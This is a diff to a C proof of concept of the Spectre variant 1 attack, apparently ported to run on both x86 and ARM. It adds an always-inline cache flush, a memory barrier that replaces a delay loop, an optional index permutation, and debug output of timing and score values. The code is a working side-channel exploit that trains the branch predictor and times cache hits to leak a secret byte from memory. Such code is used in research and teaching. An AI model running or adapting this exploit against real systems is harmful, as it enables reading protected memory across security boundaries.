@@ -3,6 +3,8 @@
 #include <string.h>
 #include <assert.h>
 
+#define VERISON "2021-06-10 10:45"
+
 #ifdef X86
 #include <x86intrin.h>
 #endif
@@ -34,7 +36,8 @@ void victim_function(size_t x)
 /********************************************************************
 Analysis code
 ********************************************************************/
-void flush_cache(uint64_t addr)
+inline __attribute__((always_inline)) void flush_cache(uint64_t addr)
+// void flush_cache(uint64_t addr)
 {
 	#ifdef X86
 	_mm_clflush(addr);
@@ -44,6 +47,17 @@ void flush_cache(uint64_t addr)
 		:
 		: "r"(addr)
 		: "memory");
+	#endif
+}
+
+inline __attribute((always_inline)) void barrier()
+{
+	#ifdef X86
+	_mm_mfence();
+	#else
+	__asm__ volatile(
+		"dmb ish"
+	);
 	#endif
 }
 
@@ -71,8 +85,11 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 	register uint64_t time1, time2;
 	volatile uint8_t *addr;
 
+	/* Reset score sheet */
 	for (i = 0; i < 256; i++)
 		results[i] = 0;
+
+	/* For each try: attempt to leak to array2 */
 	for (tries = MAX_TRIES; tries > 0; tries--)
 	{
 		/* Flush array2[256*(0..255)] from cache */
@@ -86,11 +103,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		for (j = 29; j >= 0; j--)
 		{
 			flush_cache(&array1_size);
-
-			/* Delay (can also mfence) */
-			for (volatile int z = 0; z < 100; z++)
-			{
-			}
+			barrier();
 
 			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
 			/* Avoid jumps in case those tip off the branch predictor */
@@ -110,10 +123,13 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		 * Maybe this makes the speculative window smaller?
 		 * 
 		 */
-		/* Stride prediction causes segmentation faults -- possibly because*/
 		for (i = 0; i < 256; i++)
 		{
+            #ifdef MIX
 			mix_i = ((i * 167) + 13) & 255;
+            #else
+            mix_i = i;
+            #endif
 			addr = &array2[mix_i * 512];
 			#ifdef X86
 			time1 = __rdtscp(&junk);
@@ -124,11 +140,26 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 			junk = *addr;				   /* MEMORY ACCESS TO TIME */
 			time2 = read_cycles() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 			#endif
+
+			#ifdef DEBUG
+			if (i % 64 == 0) printf("\n");
+			printf("%d ", time2);
+			#endif
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 			{
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
 			}
 		}
+
+		#ifdef DEBUG
+		printf("\n");
+		for (i = 0; i < 4; i++) {
+			for (j = 0; j < 64; j++) {
+				printf("%d ", results[i * 64 + j]);
+			}
+			printf("\n");
+		}
+		#endif
 
 		/* Locate highest & second-highest */
 		j = k = -1;
@@ -155,6 +186,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 
 int main(int argc, char **argv)
 {
+	printf("Last updated %s\n", VERISON);
 	printf("Putting '%s' in memory\n", secret);
 
 	/* Default for malicious_x is the secret string address */
